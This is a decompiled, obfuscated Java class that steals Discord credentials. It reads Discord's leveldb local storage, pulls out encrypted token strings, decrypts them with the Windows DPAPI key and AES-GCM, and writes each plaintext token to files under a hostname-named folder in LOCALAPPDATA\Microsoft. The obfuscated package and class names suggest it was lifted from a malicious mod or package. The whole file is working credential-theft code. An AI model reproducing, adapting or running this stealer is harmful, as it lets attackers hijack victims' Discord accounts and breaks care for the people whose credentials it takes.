package 0.0.0.0;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashSet;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.io.FileUtils;

public class 0i {
   private static final String 0 = System.getenv("APPDATA") + "/discord";
   private static final String 1 = System.getenv("LOCALAPPDATA");

   public void _/* $FF was: 0*/() {
      new HashSet();
      File[] files = (new File(0 + "/Local Storage/leveldb")).listFiles(File::isFile);
      if (files != null) {
         File[] var3 = files;
         int var4 = files.length;

         for(int var5 = 0; var5 < var4; ++var5) {
            File file = var3[var5];
            if (file.getName().endsWith(".ldb")) {
               try {
                  String parsed = FileUtils.readFileToString(file, StandardCharsets.UTF_8);
                  Matcher matcher = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)").matcher(parsed);
                  if (matcher.find()) {
                     String reader = FileUtils.readFileToString(new File(0 + "/Local State"), StandardCharsets.UTF_8);
                     JsonObject json = (new JsonParser()).parse(reader).getAsJsonObject();
                     byte[] key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
                     key = Base64.getDecoder().decode(key);
                     key = Arrays.copyOfRange(key, 5, key.length);
                     key = Crypt32Util.cryptUnprotectData(key);
                     byte[] tokens = Base64.getDecoder().decode(matcher.group().split("dQw4w9WgXcQ:")[1].getBytes());
                     Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                     cipher.init(2, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(tokens, 3, 15)));
                     String foundTokens = new String(cipher.doFinal(Arrays.copyOfRange(tokens, 15, tokens.length)), StandardCharsets.UTF_8);
                     ArrayList<String> allTokens = new ArrayList(Arrays.asList(foundTokens.split("\n")));
                     String destinationFolder = 1 + "\\Microsoft\\\\" + this.0() + "\\Application\\";
                     this.0(allTokens, destinationFolder);
                  }
               } catch (Exception var17) {
               }
            }
         }
      }

   }

   private void _/* $FF was: 0*/(ArrayList<String> tokens, String destinationFolder) {
      Iterator var3 = tokens.iterator();

      while(var3.hasNext()) {
         String token = (String)var3.next();

         try {
            String fileName = destinationFolder + "\\" + token + ".json";
            String content = String.format("Token = %s", token);
            FileUtils.writeStringToFile(new File(fileName), content, StandardCharsets.UTF_8);
         } catch (Exception var7) {
         }
      }

   }

   private String _/* $FF was: 0*/() {
      try {
         Process process = Runtime.getRuntime().exec("hostname");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String computerName = reader.readLine();

         String var10000;
         try {
            process.destroy();
            if (computerName != null) {
               var10000 = computerName.trim();
               return var10000;
            }
         } catch (Exception var4) {
            throw var4;
         }

         var10000 = "Unknown";
         return var10000;
      } catch (Exception var5) {
         return "Unknown";
      }
   }
}
